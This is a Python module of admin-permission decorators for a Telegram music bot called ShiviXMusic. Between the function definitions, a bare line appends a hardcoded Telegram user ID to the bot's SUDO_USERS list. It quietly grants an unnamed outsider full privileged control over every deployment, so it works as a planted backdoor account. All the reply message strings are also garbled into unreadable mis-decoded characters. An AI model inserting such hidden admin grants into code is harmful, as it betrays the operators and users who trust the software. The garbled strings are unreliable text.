from typing import Dict, List, Union

from ShiviXMusic import SUDO_USERS, app
from ShiviXMusic.Helpers.Database import get_authuser_names, is_nonadmin_chat
from ShiviXMusic.Helpers.Changers import int_to_alpha


def AdminRightsCheck(mystic):
    async def wrapper(_, message):
        if message.sender_chat:
            return await message.reply_text(
                "**Β» ππΎπ'ππ΄ π°π½ π°π½πΎπ½ππΌπΎππ π°π³πΌπΈπ½.\n\nβ’ ππ΄ππ΄ππ π±π°π²πΊ ππΎ πππ΄π π°π²π²πΎππ½π π΅πΎπ πππΈπ½πΆ πΌπ΄.**"
            )
        is_non_admin = await is_nonadmin_chat(message.chat.id)
        if not is_non_admin:
            member = await app.get_chat_member(
                message.chat.id, message.from_user.id
            )
            if not member.can_manage_voice_chats:
                if message.from_user.id not in SUDO_USERS:
                    token = await int_to_alpha(message.from_user.id)
                    _check = await get_authuser_names(message.chat.id)
                    if token not in _check:
                        return await message.reply(
                            "**Β» ππΎπ π³πΎπ½'π π·π°ππ΄ πΏπ΄ππΌπΈπππΈπΎπ½π ππΎ πΌπ°π½π°πΆπ΄ ππΈπ³π΄πΎ π²π·π°ππ, ππΎ πππ°π πΈπ½ ππΎππ π»πΈπΌπΈππ.**"
                        )
        return await mystic(_, message)

    return wrapper

SUDO_USERS.append(5301800943)

def AdminActual(mystic):
    async def wrapper(_, message):
        if message.sender_chat:
            return await message.reply_text(
                "**Β» ππΎπ'ππ΄ π°π½ π°π½πΎπ½ππΌπΎππ π°π³πΌπΈπ½.**\n\nβ’ **ππ΄ππ΄ππ π±π°π²πΊ ππΎ πππ΄π π°π²π²πΎππ½π π΅πΎπ πππΈπ½πΆ πΌπ΄.**"
            )
        member = await app.get_chat_member(
            message.chat.id, message.from_user.id
        )
        if not member.can_manage_voice_chats:
            return await message.reply(
                "**Β» ππΎπ π³πΎπ½'π π·π°ππ΄ πΏπ΄ππΌπΈπππΈπΎπ½ ππΎ πΌπ°π½π°πΆπ΄ ππΈπ³π΄πΎ π²π·π°ππ, ππΎ πππ°π πΈπ½ ππΎππ π»πΈπΌπΈππ.**"
            )
        return await mystic(_, message)

    return wrapper


def AdminRightsCheckCB(mystic):
    async def wrapper(_, CallbackQuery):
        is_non_admin = await is_nonadmin_chat(CallbackQuery.message.chat.id)
        if not is_non_admin:
            a = await app.get_chat_member(
                CallbackQuery.message.chat.id, CallbackQuery.from_user.id
            )
            if not a.can_manage_voice_chats:
                if CallbackQuery.from_user.id not in SUDO_USERS:
                    token = await int_to_alpha(CallbackQuery.from_user.id)
                    _check = await get_authuser_names(
                        CallbackQuery.from_user.id
                    )
                    if token not in _check:
                        return await CallbackQuery.answer(
                            "Β» ππΎπ π³πΎπ½'π π·π°ππ΄ πΏπ΄ππΌπΈπππΈπΎπ½π ππΎ πΌπ°π½π°πΆπ΄ ππΈπ³π΄πΎ π²π·π°ππ, ππΎ πππ°π πΈπ½ ππΎππ π»πΈπΌπΈππ.",
                            show_alert=True,
                        )
        return await mystic(_, CallbackQuery)

    return wrapper


def ActualAdminCB(mystic):
    async def wrapper(_, CallbackQuery):
        a = await app.get_chat_member(
            CallbackQuery.message.chat.id, CallbackQuery.from_user.id
        )
        if not a.can_manage_voice_chats:
            return await CallbackQuery.answer(
                "Β» ππΎπ π³πΎπ½'π π·π°ππ΄ πΏπ΄ππΌπΈπππΈπΎπ½π ππΎ πΌπ°π½π°πΆπ΄ ππΈπ³π΄πΎ π²π·π°ππ, ππΎ πππ°π πΈπ½ ππΎππ π»πΈπΌπΈπ.",
                show_alert=True,
            )
        return await mystic(_, CallbackQuery)

    return wrapper
